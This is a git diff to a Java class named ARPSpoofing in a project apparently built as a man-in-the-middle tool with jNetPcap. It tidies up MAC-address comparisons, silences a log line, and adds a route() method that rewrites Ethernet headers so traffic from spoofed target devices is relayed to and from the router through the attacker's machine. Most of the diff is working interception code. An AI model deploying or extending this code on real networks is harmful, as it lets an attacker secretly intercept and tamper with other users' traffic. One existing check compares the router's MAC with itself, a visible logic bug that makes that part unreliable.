@@ -7,6 +7,8 @@ import java.util.ArrayList;
 import java.util.Enumeration;
 
 import org.jnetpcap.Pcap;
+import org.jnetpcap.packet.PcapPacket;
+import org.jnetpcap.protocol.network.Ip4;
 
 import com.SHGroup.mitm.Main;
 import com.SHGroup.mitm.Utils;
@@ -42,8 +44,7 @@ public class ARPSpoofing {
 			Enumeration<NetworkInterface> e = NetworkInterface.getNetworkInterfaces();
 			while (e.hasMoreElements()) {
 				NetworkInterface n = (NetworkInterface) e.nextElement();
-				if (n.getHardwareAddress() != null
-						&& Utils.bytesToString(n.getHardwareAddress()).equals(Utils.bytesToString(localMac))) {
+				if (n.getHardwareAddress() != null && Utils.byteArrayEquals(n.getHardwareAddress(), localMac)) {
 					Enumeration<InetAddress> ee = n.getInetAddresses();
 					while (ee.hasMoreElements()) {
 						InetAddress inet = (InetAddress) ee.nextElement();
@@ -73,7 +74,7 @@ public class ARPSpoofing {
 			if (router == null) {
 				router = new Device(routerMac, routerIP);
 			} else {
-				if (!Utils.bytesToString(router.getMac()).equals(Utils.bytesToString(router.getMac()))) {
+				if (!Utils.byteArrayEquals(router.getMac(), router.getMac())) {
 					router = new Device(routerMac, routerIP);
 				}
 			}
@@ -90,9 +91,9 @@ public class ARPSpoofing {
 
 	public void responseARPReply(ARPPacket arp) {
 		if (arp.getOpcode()[0] == 0x00 && arp.getOpcode()[1] == 0x02) { // reply packet
-			if (Utils.bytesToString(arp.getSenderMac()).equals(Utils.bytesToString(localMac))) {
-				Main.gui.appendLog(
-						"Send reply packet (to " + Utils.getIPandMACToString(arp.getTargetIP(), arp.getTargetMac()));
+			if (Utils.byteArrayEquals(arp.getSenderMac(), localMac)) {
+//				Main.gui.appendLog(
+//						"Send reply packet (to " + Utils.getIPandMACToString(arp.getTargetIP(), arp.getTargetMac()));
 				return;
 			}
 			if (arp.getSenderIP()[3] == 1) {
@@ -174,6 +175,70 @@ public class ARPSpoofing {
 
 		public void stopRun() {
 			this.isExit = true;
+		}
+	}
+
+	public void route(PcapPacket packet, byte[] data) {
+		if (routerMac == null || localMac == null || targets.size() == 0) {
+			return;
+		}
+		byte[] destMac = new byte[6];
+		byte[] srcMac = new byte[6];
+
+		Utils.copy(data, 0, destMac, 0);
+		Utils.copy(data, 6, srcMac, 0);
+
+		Ip4 ip = new Ip4();
+
+		if (Utils.byteArrayEquals(destMac, localMac) && Utils.byteArrayEquals(srcMac, localMac)) {
+			if (packet.hasHeader(ip)) {
+				if (Utils.byteArrayEquals(localIP, ip.source())) {
+					byte[] newPacket = new byte[data.length];
+					for (int i = 0; i < 6; i++) {
+						newPacket[i] = routerMac[i];
+					}
+					for (int i = 6; i < data.length; i++) {
+						newPacket[i] = data[i];
+					}
+					Main.network.getPcap().sendPacket(newPacket);
+				}
+			}
+		} else if (Utils.byteArrayEquals(destMac, localMac) && Utils.byteArrayEquals(srcMac, routerMac)) {
+			if (packet.hasHeader(ip)) {
+				for (Device d : targets) {
+					if (Utils.byteArrayEquals(d.getIP(), ip.destination())) {
+						byte[] newPacket = new byte[data.length];
+						for (int i = 0; i < 6; i++) {
+							newPacket[i] = d.getMac()[i];
+						}
+						for (int i = 6; i < 12; i++) {
+							newPacket[i] = localMac[i - 6];
+						}
+						for (int i = 12; i < data.length; i++) {
+							newPacket[i] = data[i];
+						}
+						Main.network.getPcap().sendPacket(newPacket);
+					}
+				}
+			}
+		} else {
+			for (Device d : targets) {
+				if (Utils.byteArrayEquals(destMac, localMac) && Utils.byteArrayEquals(srcMac, d.getMac())) {
+					if (packet.hasHeader(ip)) {
+						byte[] newPacket = new byte[data.length];
+						for (int i = 0; i < 6; i++) {
+							newPacket[i] = routerMac[i];
+						}
+						for (int i = 6; i < 12; i++) {
+							newPacket[i] = localMac[i - 6];
+						}
+						for (int i = 12; i < data.length; i++) {
+							newPacket[i] = data[i];
+						}
+						Main.network.getPcap().sendPacket(newPacket);
+					}
+				}
+			}
 		}
 	}
 }
